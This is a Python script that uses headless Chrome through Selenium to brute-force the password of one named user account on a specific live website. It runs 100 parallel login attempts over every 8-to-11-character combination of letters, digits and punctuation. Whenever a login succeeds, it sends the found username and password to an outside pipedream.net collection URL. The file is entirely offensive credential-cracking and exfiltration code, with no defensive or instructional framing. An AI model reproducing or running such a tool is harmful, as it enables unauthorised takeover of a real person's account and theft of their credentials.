from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from concurrent.futures import ThreadPoolExecutor
import time
import itertools
import string
import requests
def login(username, password):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    try:
        with webdriver.Chrome(options=chrome_options) as chrome_driver:
            chrome_driver.get("https://ssidollars.pythonanywhere.com/accounts/login/?next=/awards/student/560/spend/")
            username_field = chrome_driver.find_element(By.ID, "id_username")
            password_field = chrome_driver.find_element(By.ID, "id_password")
            username_field.send_keys(username)
            password_field.send_keys(password)
            password_field.send_keys(Keys.RETURN)
            time.sleep(10)
            if "Your username and password didn't match." not in chrome_driver.page_source:
                print(f"Valid login: username - {username}, password - {password}")
                requests.get("https://eobluu4k4ukflxm.m.pipedream.net", params={"username": username, "password": password})
            else:
                print(f"Invalid login: username - {username}, password - {password}")
    except Exception as e:
        print(f"An error occurred while logging in: {str(e)}")
characters = string.ascii_letters + string.digits + string.punctuation
min_length = 8
max_length = 11
executor = ThreadPoolExecutor(max_workers=100)
for length in range(min_length, max_length + 1):
    combinations = itertools.product(characters, repeat=length)
    for combination in combinations:
        password = "".join(combination)
        executor.submit(login, "peterkoo81", password)
executor.shutdown(wait=True)
